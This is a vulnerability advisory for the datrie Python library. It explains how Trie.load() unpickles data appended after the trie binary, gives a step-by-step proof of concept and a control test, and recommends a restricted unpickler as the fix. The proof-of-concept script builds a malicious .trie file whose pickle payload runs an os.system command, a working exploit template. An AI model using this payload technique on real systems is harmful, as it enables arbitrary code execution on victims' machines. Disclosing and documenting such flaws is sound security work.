# Arbitrary Code Execution via Insecure Deserialization in `datrie.Trie`

## Summary

The `datrie.Trie` class uses `pickle.load()` to deserialize internal data when loading trie files via `Trie.load()`, `Trie.read()`, and `Trie.__setstate__()`. A crafted `.trie` file can embed a malicious pickle payload that executes arbitrary Python code when the file is loaded. Users have no indication that loading a `.trie` file involves code execution, as the unsafe deserialization is hidden behind a data-loading API. The `datrie.BaseTrie` class is not affected as it does not use pickle.
## Details

| Field | Value |
|---|---|
| **Package** | [datrie](https://github.com/pytries/datrie) |
| **Affected Versions** | All versions through 0.8.3 |
| **CWE** | [CWE-502](https://cwe.mitre.org/data/definitions/502.html) — Deserialization of Untrusted Data |
| **Severity** | Critical |
| **Impact** | Arbitrary Code Execution |
| **Vulnerability Discovered** | 21-03-2026 |
| **Researcher Name** | Dhabaleshwar Das |

### Vulnerable Code

The root cause is the use of `pickle.load()` on untrusted file contents in [`src/datrie.pyx`](https://github.com/pytries/datrie/blob/master/src/datrie.pyx).

**Three vulnerable entry points exist:**

#### 1. `Trie.__setstate__()` — Line 678

```python
def __setstate__(self, bytes state):
    assert self._c_trie is NULL
    with tempfile.NamedTemporaryFile() as f:
        f.write(state)
        f.flush()
        f.seek(0)
        self._c_trie = _load_from_file(f)
        self._values = pickle.load(f)   # <- VULNERABLE
```

#### 2. `Trie.read()` — Line 730

```python
@classmethod
def read(cls, f):
    cdef Trie trie = super(Trie, cls).read(f)
    trie._values = pickle.load(f)       # <- VULNERABLE
    return trie
```

#### 3. `Trie.write()` — Line 721 (creates the exploitable format)

```python
def write(self, f):
    super(Trie, self).write(f)
    pickle.dump(self._values, f)        # <- Stores pickle after trie binary
```

The file format for `Trie` is: `[valid trie binary data][pickled Python objects]`. Since `Trie.load()` calls `Trie.read()`, which calls `BaseTrie.read()` to consume the trie binary portion and then passes the **remaining file content** directly to `pickle.load()`, an attacker can append a malicious pickle payload after valid trie data.



## Proof of Concept

### STEP 1: Open Your Terminal

---

### STEP 2: Install What You Need

Copy this ENTIRE line, paste it into the terminal, press Enter:

```
sudo apt update && sudo apt install -y python3 python3-pip python3-venv
```
---

### STEP 3: Create a Testing Environment (Optional)

```
python3 -m venv ~/datrie-test
source ~/datrie-test/bin/activate
```

Your terminal prompt should now start with `(datrie-test)`. This means you're in a safe virtual environment.

---

### STEP 4: Install datrie

```
pip install datrie
```

Wait until it says `Successfully installed datrie-...`

Verify it works:

```
python3 -c "import datrie; print('datrie installed successfully')"
```

You should see: `datrie installed successfully`

<img width="901" height="188" alt="1" src="https://github.com/user-attachments/assets/d5e8f4d7-64a9-4a27-a0b7-6d06b8f810eb" />


---

### STEP 5: Create the Attacker's Script

This is the script that creates the malicious `.trie` file. In a real attack, the attacker does this on THEIR computer and sends the file to the victim.

**Type this command to create the file:**

```
nano ~/datrie-test/create_evil.py
```
<img width="497" height="233" alt="2" src="https://github.com/user-attachments/assets/839de206-aac1-421e-8905-dca9d642054f" />


A text editor opens inside your terminal. Now **carefully paste** the following code into it:

```python
import datrie
import pickle
import os

# Step A: Create a normal trie and save it (just the binary part)
bt = datrie.BaseTrie(ranges=[('a', 'z')])
bt['test'] = 1
bt.save('/tmp/base_trie.dat')

# Step B: Read the binary data
with open('/tmp/base_trie.dat', 'rb') as f:
    trie_binary_data = f.read()

# Step C: Create the malicious pickle payload
class Exploit:
    def __reduce__(self):
        cmd = 'echo "CODE_EXECUTED_BY_DHABAL" > /tmp/proof.txt'
        return (os.system, (cmd,))

evil_values = [Exploit()]
evil_pickle_data = pickle.dumps(evil_values)

# Step D: Combine into one file: valid trie + evil pickle
with open('/tmp/evil_dictionary.trie', 'wb') as f:
    f.write(trie_binary_data)
    f.write(evil_pickle_data)

print("Malicious file created: /tmp/evil_dictionary.trie")
print("This file looks like a normal trie dictionary file.")
print("When someone loads it, it will secretly run a command.")
```

<img width="981" height="608" alt="3" src="https://github.com/user-attachments/assets/c3cabb56-f5aa-43f4-9bac-0bc2d061b560" />


---

### STEP 6: Run the Attacker's Script (Create the Evil File)

```
python3 ~/datrie-test/create_evil.py
```

You should see:
```
Malicious file created: /tmp/evil_dictionary.trie
This file looks like a normal trie dictionary file.
When someone loads it, it will secretly run a command.
```

**Verify the evil file exists:**

```
ls -la /tmp/evil_dictionary.trie
```

You should see the file listed with its size.

<img width="612" height="246" alt="4" src="https://github.com/user-attachments/assets/a8ea8829-a88d-4c6c-b64b-14af4049fa34" />


---

### STEP 7: Verify the Proof File Does NOT Exist Yet

This is important - we need to show that `/tmp/proof.txt` does not exist BEFORE we load the evil trie.

```
cat /tmp/proof.txt
```

You should see:
```
cat: /tmp/proof.txt: No such file or directory
```

Good. The file does not exist yet. Remember this, it matters for the proof.

<img width="443" height="212" alt="5" src="https://github.com/user-attachments/assets/c90e3a36-cd1b-45e1-a0da-ba5984ece9f0" />


---

### STEP 8: Create the Victim's Script

This is what a normal user would write. There is NOTHING suspicious here. They're just loading a trie file.

**Type this command to create the file:**

```
nano ~/datrie-test/victim_app.py
```

Paste this code:

```python
import datrie

print("=== Normal Application ===")
print("Loading dictionary file...")
print()

# This is what any normal user would do.
# They received a .trie file and want to use it.
# They have NO idea this will execute code.

try:
    trie = datrie.Trie.load('/tmp/evil_dictionary.trie')
    print("Trie loaded. Keys:", list(trie.keys()))
except Exception as e:
    print("Trie loading had an error:", e)
    print("BUT — check if the command already ran!")

print()
print("=== Checking if attacker's code executed ===")

try:
    with open('/tmp/proof.txt', 'r') as f:
        content = f.read().strip()
    print("RESULT: VULNERABLE!")
    print("The file /tmp/proof.txt now contains:", content)
    print("The attacker's code ran just by loading a .trie file!")
except FileNotFoundError:
    print("RESULT: Not vulnerable (proof file was not created)")
```

Save and exit nano (`Ctrl+O`, `Enter`, `Ctrl+X`).

<img width="898" height="538" alt="6" src="https://github.com/user-attachments/assets/7393400a-5dda-434e-b80d-d0c4ca8bef0f" />


---

### STEP 9: Run the Victim's Script (Trigger the Bug)

```
python3 ~/datrie-test/victim_app.py
```

**What you should see:**

```
=== Normal Application ===
Loading dictionary file...

Trie loading had an error: [some error message]
BUT — check if the command already ran!

=== Checking if attacker's code executed ===
RESULT: VULNERABLE!
The file /tmp/proof.txt now contains: CODE_EXECUTED_BY_DHABAL
The attacker's code ran just by loading a .trie file!
```

**That's the proof.** The victim only called `Trie.load()` on a file. They never asked to run any command. But the attacker's command ran anyway and created `/tmp/proof.txt`.

<img width="585" height="290" alt="7" src="https://github.com/user-attachments/assets/43ac2437-6dc3-4d6a-a39c-dce79b3b6a09" />


---

### STEP 10: Double-Check Manually

You can also verify by reading the file yourself:

```
cat /tmp/proof.txt
```

Output:
```
CODE_EXECUTED_BY_DHABAL
```

This file was created by the attacker's hidden command inside the `.trie` file. The victim never knew.

<img width="618" height="365" alt="8" src="https://github.com/user-attachments/assets/20391938-a532-4528-84ef-90be40633ab6" />


---

### STEP 11: Prove BaseTrie is Safe (Control Test)

To show this is specifically a `Trie` bug (not `BaseTrie`), let's prove `BaseTrie.load()` does NOT run code:

```
nano ~/datrie-test/safe_test.py
```
<img width="520" height="162" alt="9" src="https://github.com/user-attachments/assets/7744c726-68ba-4714-ad53-03ccfb073827" />


Paste this:

```python
import datrie
import os

# Delete proof file so we start clean
try:
    os.remove('/tmp/proof.txt')
except FileNotFoundError:
    pass

print("proof.txt deleted. Starting clean.")
print()

# Try loading the evil file with BaseTrie instead of Trie
print("Loading evil file with BaseTrie.load()...")
try:
    bt = datrie.BaseTrie.load('/tmp/evil_dictionary.trie')
    print("BaseTrie loaded. Keys:", list(bt.keys()))
except Exception as e:
    print("BaseTrie rejected it:", e)

print()

# Check if proof.txt was created
if os.path.exists('/tmp/proof.txt'):
    print("UNEXPECTED: proof.txt exists. Code ran!")
else:
    print("SAFE: proof.txt was NOT created.")
    print("BaseTrie.load() does NOT use pickle.")
    print("Only Trie.load() is vulnerable.")
```

Save and exit (`Ctrl+O`, `Enter`, `Ctrl+X`).

<img width="818" height="538" alt="10" src="https://github.com/user-attachments/assets/83ce9023-b442-4cbb-9b10-5116b623688d" />


Run it:

```
python3 ~/datrie-test/safe_test.py
```

**Expected output:**

```
proof.txt deleted. Starting clean.

Loading evil file with BaseTrie.load()...
BaseTrie loaded. Keys: ['test']

SAFE: proof.txt was NOT created.
BaseTrie.load() does NOT use pickle.
Only Trie.load() is vulnerable.
```

This proves the bug is specifically in `Trie`, not `BaseTrie`.

<img width="581" height="261" alt="11" src="https://github.com/user-attachments/assets/d857a128-8925-404b-8d7b-a5a83412ea44" />



**Why `BaseTrie` is safe:**
`BaseTrie.read()` (line 141) only calls `_load_from_file(f)` (a C-level trie parser) and never invokes `pickle`:

```python
@classmethod
def read(cls, f):
    cdef BaseTrie trie = cls(_create=False)
    trie._c_trie = _load_from_file(f)   # C-level only, no pickle
    return trie
```

---

## Remediation

**Recommended fix:** Replace `pickle.load()` / `pickle.dump()` with a safe serialization format (e.g., JSON, msgpack) or use a restricted unpickler that only permits basic Python types:

```python
import pickle

class SafeUnpickler(pickle.Unpickler):
    ALLOWED = {
        'builtins': {'list', 'dict', 'set', 'tuple', 'int', 'float', 'str', 'bool', 'NoneType'},
    }
    def find_class(self, module, name):
        if module in self.ALLOWED and name in self.ALLOWED[module]:
            return super().find_class(module, name)
        raise pickle.UnpicklingError(f"Forbidden: {module}.{name}")
```

## References

- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [Python pickle security warning](https://docs.python.org/3/library/pickle.html#module-pickle)
- [datrie source — `src/datrie.pyx`](https://github.com/pytries/datrie/blob/master/src/datrie.pyx)
